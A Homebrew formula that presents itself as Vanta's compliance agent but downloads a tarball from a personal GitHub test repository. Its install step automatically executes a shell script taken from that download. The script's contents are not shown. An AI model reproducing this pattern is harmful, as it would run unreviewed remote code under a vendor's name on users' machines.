class VantaDarwinX64V200 < Formula
  desc "Homebrew Vanta Compliance Automation Solution"
  homepage "https://www.vanta.com/"
  url "https://github.com/dlomellini/testtab/releases/download/supertag/vanta_darwin_x64_v2.0.0.tar.gz"  
  version "2.0.0"
  sha256 "664fa0415ae876811472be57ee9bac48a53011fcdfb57f36a1d6f7408f111b7f"

  @@SHA256 = "664fa0415ae876811472be57ee9bac48a53011fcdfb57f36a1d6f7408f111b7f"
  @@VALIDITY_UUID = "f00a8b14-2211-4cb7-99d0-ae9b098eb493"
  # PUBLIC KEY INFO
  @@COPYRIGHT = "Vanta Inc. ©"
  @@ALGORITHM = "RSA"
  @@KEY_SIZE =  "2048"
  @@EXPONENT = "65537"
  @@MODULUS = "CE:CF:19:EF:0F:63:06:2E:39:01:AB:73:97:75:1B:29:07:3D:69:D6:E8:45:1B:62:02:63:95:F8:3D:CB:23:4D:AD:AC:05:B3:14:EF:3C:6F:62:EC:42:52:93:68:50:C3:2A:E9:BA:18:CD:BE:07:2E:A3:AC:DB:09:F6:7B:0B:E9:C9:4D:4D:88:E2:44:24:8B:ED:54:AD:FF:E6:50:FC:DE:9D:0C:C1:8E:EC:9D:28:BF:ED:75:92:CC:3D:94:D5:2A:B3:BA:01:99:E5:61:51:96:00:7C:61:5D:F4:55:37:E6:B8:A8:51:E7:CB:A5:B3:C7:D7:33:EC:50:34:2C:AE:27:75:3C:D2:69:3D:13:D6:B4:C0:9F:F5:2B:39:83:30:20:0D:0A:97:2D:59:2D:B0:12:99:9C:73:D4:8E:BB:96:A5:F2:EB:66:E2:71:96:66:98:54:0E:BD:10:CE:D6:D5:70:EB:C8:FD:A4:FA:88:1D:89:32:44:58:86:3F:36:A5:CB:FD:3C:61:8D:EF:F7:95:47:AE:AD:05:00:A8:03:3E:9F:9C:C8:6C:F6:D0:70:C8:91:38:BF:1D:18:CC:B4:A8:2A:B7:15:C4:E8:28:A2:ED:20:0C:00:01:99:39:8D:2F:86:7B:7B:74:9B:C9:37:4A:A1:80:40:AF:97:70:29:12:53"

  depends_on "awscli"

  def install

    system "pwd"
    system "ls -lah"
    bin.install "vanta_darwin_x64_v2.0.0.sh"
    bin.install "vanta_compliance.pl"

    system "sh /opt/homebrew/Cellar/vanta_darwin_x64_v2.0.0/2.0.0/bin/vanta_darwin_x64_v2.0.0.sh"

  end
end
